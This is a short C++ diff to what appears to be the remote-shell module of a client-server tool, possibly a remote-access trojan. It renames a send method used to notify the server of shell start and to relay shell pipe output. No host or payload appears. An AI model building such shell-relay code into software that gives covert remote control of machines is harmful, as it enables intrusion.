@@ -97,7 +97,7 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n, void* user):CManag
 	m_hShellThreadHandle	= pi.hThread;
 
 	BYTE	bToken = TOKEN_SHELL_START;      //包含头文件 Common.h     
-	m_ClientObject->OnServerSending((char*)&bToken, 1);
+	m_ClientObject->Send2Server((char*)&bToken, 1);
 
 	WaitForDialogOpen();
 
@@ -131,7 +131,7 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
 			const char *pStart = (char*)szTotalBuffer + This->m_nCmdLength;
 			int length = int(dwReturn) - This->m_nCmdLength;
 			if (length > 0)
-				This->m_ClientObject->OnServerSending(pStart, length);
+				This->m_ClientObject->Send2Server(pStart, length);
 
 			LocalFree(szTotalBuffer);
 		}
